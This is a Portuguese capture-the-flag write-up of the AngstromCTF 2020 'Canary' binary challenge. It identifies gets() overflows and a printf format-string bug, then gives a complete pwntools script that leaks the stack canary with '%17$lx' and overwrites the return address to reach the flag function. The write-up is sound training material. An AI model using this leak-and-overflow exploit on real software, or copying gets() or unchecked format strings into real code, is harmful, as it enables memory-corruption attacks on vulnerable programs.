# Canary -- pwn -- 70pts/319 solves

### Enumeração de Falhas
A challenge nos oferece seu respectivo source code.
Inicialmente, nota-se duas falhas de BoF:

```
	char name[20];
	gets(name);
	...
	char info[50];
	gets(info); 
```

Função gets não impõe checkagens no limite de quantos bytes são lidos, logo, ela é sujeita a falhas de Buffer Overflow (bof).

Porém, além dessa falha, há uma outra falha de Format String:
```
	printf(strcat(name, "!\n"));
```

### Explorando as falhas encontradas
```
fex0r:~/C/A/canary
➤ checksec ./canary
[*] '/home/fex0r/CTF-Writeups/AngstromCTF2020/canary/canary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Ok, stack-cookie/canary protection está ativa, isto seria um problema se não houvessem maneiras de leakar o stack-cookie.
Stack-Cookie / Canary é um valor colocado na stack, que de função em função, é checkado a fim de perceber alterações nele. Se houvesse um Buffer Overflow sem precedentes, seu valor original seria sobescrito, de forma a triggar o fim da execução do programa naquele exato instante com a seguinte mensagem; "--stack smashing detected--".

Usando a falha de FMT, podemos leakar o valor do stack canary - posicionado na stack -, e re-introduzirmos ele em seu devido offset na stack no momento em que executamos o BoF, de forma que o binário nao perceba mudança no valor original do stack-cookie logo, não interrompendo sua própria execução.

```
from pwn import *

p = remote("shell.actf.co", 20701)
e = ELF("./canary")

xpl = ""
xpl += "%17$lx" #canary leak

p.sendlineafter("your name?", xpl)
canary = p.recvline()
canary = canary.split(" ")[5].replace("!", "")
canary = int(canary, 16)
info("Canary ==> %s"%hex(canary))

xpl = ""
xpl += "A"*56 #padding até posição do stack-cookie/canary
xpl += p64(canary) #valor do canary -originalmente-
xpl += "A"*8
xpl += p64(e.sym["flag"])
p.sendlineafter("tell me?", xpl)

p.interactive()
```